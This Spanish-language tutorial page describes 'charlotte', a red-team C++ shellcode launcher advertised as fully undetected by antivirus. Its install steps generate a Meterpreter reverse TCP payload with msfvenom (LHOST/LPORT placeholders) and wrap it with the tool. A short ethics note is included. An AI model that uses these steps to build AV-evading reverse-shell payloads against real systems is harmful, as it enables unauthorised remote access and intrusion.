---
title: "charlotte: c++ fully undetected shellcode launcher ;)"
slug: "charlotte"
summary: "c++ fully undetected shellcode launcher ;)"
category: "ciberseguridad"
level: "Intermedio"
reading: 6
tags: ['initial-access', 'payload-development', 'red-team']
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es charlotte

charlotte es una herramienta de seguridad ofensiva / red team. c++ fully undetected shellcode launcher ;)

Forma parte del ecosistema de herramientas de adversary simulation y es útil para comprender cómo operan los atacantes y cómo detectar sus técnicas.

- **Repositorio oficial:** [https://github.com/9emin1/charlotte](https://github.com/9emin1/charlotte)
- **Sección del toolkit:** Initial Access → Payload Development

## Objetivo y función

El objetivo principal de charlotte es c++ fully undetected shellcode launcher ;).

En un engagement de red team, esta herramienta se usa para automatizar o simplificar una fase concreta del ataque (reconocimiento, acceso inicial, movimiento lateral, evasión, etc.), reduciendo el tiempo manual y aumentando la cobertura.

## Instalación

git clone the repository, generate your shellcode file with the naming beacon.bin, and run charlotte.py

example:
1. git clone https://github.com/9emin1/charlotte.git && apt-get install mingw-w64*
2. cd charlotte
3. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > beacon.bin
4. python charlotte.py
5. profit

## Uso básico

Consulta el README oficial para la sintaxis exacta. Un flujo típico:

```bash
# Clonar
git clone https://github.com/9emin1/charlotte
cd charlotte

# Revisar ayuda
./charlotte --help 2>/dev/null || python3 -m charlotte --help 2>/dev/null || true
```

> Adapta los comandos a tu entorno. Muchas de estas herramientas requieren privilegios elevados o sistemas Windows/Active Directory.

## ¿Se puede usar en Termux?

Este repositorio puede instalarse en Termux si el dispositivo cumple los requisitos (Python/Go/Rust y dependencias). En Android, ejecuta los comandos dentro de Termux y verifica permisos de red/almacenamiento.

## Buenas prácticas y ética

Usa charlotte únicamente en entornos que poseas o para los que tengas autorización escrita. El uso no autorizado es ilegal. En laboratorios, monta una VM aislada y una red de pruebas.

## Referencias

- Repositorio: https://github.com/9emin1/charlotte
- Toolkit de origen: Red Teaming Toolkit
